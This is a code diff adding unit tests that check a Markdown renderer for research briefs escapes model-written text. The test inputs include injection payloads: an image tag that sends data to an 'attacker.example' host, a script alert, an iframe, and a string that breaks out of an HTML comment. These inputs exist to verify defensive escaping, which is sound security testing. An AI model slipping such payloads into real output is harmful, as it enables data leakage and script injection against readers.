@@ -434,3 +434,35 @@ describe("markdownEnhancedRenderer", () => {
     expect(decoded).toContain("# Should we enter the German market?");
   });
 });
+
+// ---------------------------------------------------------------------------
+// Model text is data in the Markdown output (OWASP LLM05)
+// ---------------------------------------------------------------------------
+
+describe("renderMarkdownEnhanced — model text cannot become markup", () => {
+  test("raw HTML in a section, a claim or a title is written inert", () => {
+    const brief = makeBrief();
+    brief.synthesis.sections[0]!.content_markdown = 'Margins held. <img src="https://attacker.example/b?d=1">';
+    brief.synthesis.sections[0]!.title = "Intro <script>alert(1)</script>";
+    brief.research.findings[0]!.claim = "c1 <iframe src=https://attacker.example>";
+    const md = renderMarkdownEnhanced(brief, { include_appendices: true });
+    expect(md).not.toMatch(/<(img|script|iframe)/);
+    expect(md).toContain('Margins held. &lt;img src="https://attacker.example/b?d=1">');
+  });
+
+  test("a validation issue cannot close the comment it is written in", () => {
+    const brief = makeBrief();
+    brief.synthesis.sections[0]!.validation_issues = ["fine --> # Injected heading"];
+    const md = renderMarkdownEnhanced(brief);
+    const comment = md.slice(md.indexOf("<!-- Validation issues:"));
+    expect(comment.indexOf("-->")).toBe(comment.indexOf("\n-->") + 1);
+  });
+
+  test("a URL with parentheses or spaces stays one link target", () => {
+    const brief = makeBrief();
+    const source = { ...SRC_A, url: "https://example.org/wiki/Foo_(bar) x" };
+    brief.synthesis.sections[0]!.sources_cited = [source];
+    const md = renderMarkdownEnhanced(brief);
+    expect(md).toContain("[Reuters article A](https://example.org/wiki/Foo_%28bar%29%20x)");
+  });
+});
